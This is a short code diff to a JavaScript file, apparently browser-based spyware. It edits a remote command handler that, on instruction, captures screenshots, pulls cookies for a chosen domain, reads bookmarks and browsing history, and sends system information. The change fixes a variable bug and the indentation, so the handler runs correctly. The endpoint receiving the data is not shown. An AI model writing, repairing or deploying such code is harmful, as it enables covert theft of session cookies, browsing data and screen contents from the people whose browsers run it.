@@ -128,24 +128,29 @@ async function sendSystemInfo() {
 // === Handle Commands ===
 async function handleCommand(cmd) {
   switch (cmd.type?.toLowerCase()) {
-case 'take_screenshot':
-case 'screenshot':
-  console.log('[Handling Command] screenshot => captureScreenshot');
-  await captureScreenshot(command.payload?.quality || 50);
-  break;
+    case 'take_screenshot':
+    case 'screenshot':
+      console.log('[Handling Command] screenshot => captureScreenshot');
+      await captureScreenshot(cmd.payload?.quality || 50);
+      break;
+
     case 'getcookies':
       await getCookiesForDomain(cmd.payload?.domain || null);
       break;
+
     case 'bookmarks':
       await getBookmarks();
       break;
+
     case 'history':
       await getBrowsingHistory(cmd.payload?.days || 7);
       break;
+
     case 'sysinfo':
     case 'enumeration':
       await sendSystemInfo();
       break;
+
     default:
       console.warn('[Unknown CMD]', cmd);
   }
@@ -257,4 +262,5 @@ if (typeof window !== 'undefined') {
     }
   };
 }
+
 
